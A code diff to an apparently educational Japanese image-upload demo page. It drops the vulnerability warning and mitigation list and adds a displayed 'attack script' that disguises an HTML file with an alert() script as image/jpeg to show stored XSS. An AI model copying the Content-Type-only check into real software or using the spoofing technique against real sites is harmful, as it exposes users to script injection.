@@ -36,9 +36,6 @@ export default function Home() {
       <div className="max-w-2xl mx-auto">
         <div className="bg-white rounded-lg shadow-xl p-8">
           <h1 className="text-3xl font-bold text-gray-800 mb-2">画像アップロード</h1>
-          <p className="text-sm text-red-600 mb-6">⚠️ Content-Type検証のみデモ（脆弱性あり）</p>
-
-
 
           <form onSubmit={handleUpload} className="space-y-4">
             <div>
@@ -75,26 +72,31 @@ export default function Home() {
             </div>
           )}
 
-          <div className="mt-8 p-4 bg-yellow-50 border border-yellow-200 rounded-lg">
-            <h3 className="font-semibold text-yellow-800 mb-2">📚 攻撃の流れ</h3>
-            <ol className="text-sm text-yellow-700 space-y-1 list-decimal list-inside">
-              <li>サーバーはContent-Typeのみ検証 (image/jpeg, image/png)</li>
-              <li>攻撃者が開発者ツールで直接APIを叩く</li>
-              <li>HTMLファイルをContent-Type: image/jpegで偽装してアップロード</li>
-              <li>被害者がファイルをダウンロードして開く</li>
-              <li>ブラウザがHTMLとして解釈し、JavaScriptが実行される</li>
+          <div className="mt-8 p-4 bg-blue-50 border border-blue-200 rounded-lg">
+            <h3 className="font-semibold text-blue-800 mb-2">ファイルの検証</h3>
+            <ol className="text-sm text-blue-700 space-y-1 list-decimal list-inside">
+              <li>フロントエンドは拡張子をチェック (image/jpeg, image/png)</li>
+              <li>サーバーはContent-Typeを検証 (image/jpeg, image/png)</li>
             </ol>
           </div>
 
-          <div className="mt-4 p-4 bg-red-50 border border-red-200 rounded-lg">
-            <h3 className="font-semibold text-red-800 mb-2">🛡️ 対策</h3>
-            <ul className="text-sm text-red-700 space-y-1">
-              <li>• マジックバイトでファイル内容を検証（JPEG: FF D8 FF、PNG: 89 50 4E 47）</li>
-              <li>• Content-Typeは信頼しない（攻撃者が偽装可能）</li>
-              <li>• Content-Disposition: attachment でダウンロード強制</li>
-              <li>• X-Content-Type-Options: nosniff を設定</li>
-              <li>• アップロードファイルを別ドメインで配信</li>
-            </ul>
+          <div className="mt-8 p-4 bg-yellow-50 border border-yellow-200 rounded-lg">
+            <h3 className="font-semibold text-yellow-800 mb-2">攻撃スクリプト</h3>
+            <pre className="text-xs text-yellow-700 overflow-x-auto bg-yellow-100 p-2 rounded">
+              <code>{`// HTMLファイルを作成
+const html = '<!DOCTYPE html><html><body><h1>🚨 XSS</h1><script>alert("Attack!")</script></body></html>';
+
+// Content-Typeを 'image/jpeg' に偽装
+const blob = new Blob([html], { type: 'image/jpeg' });
+const file = new File([blob], 'attack.html', { type: 'image/jpeg' });
+
+// ファイル入力に設定
+const dt = new DataTransfer();
+dt.items.add(file);
+
+const input = document.querySelector('input[type="file"]');
+input.files = dt.files;`}</code>
+            </pre>
           </div>
         </div>
       </div>
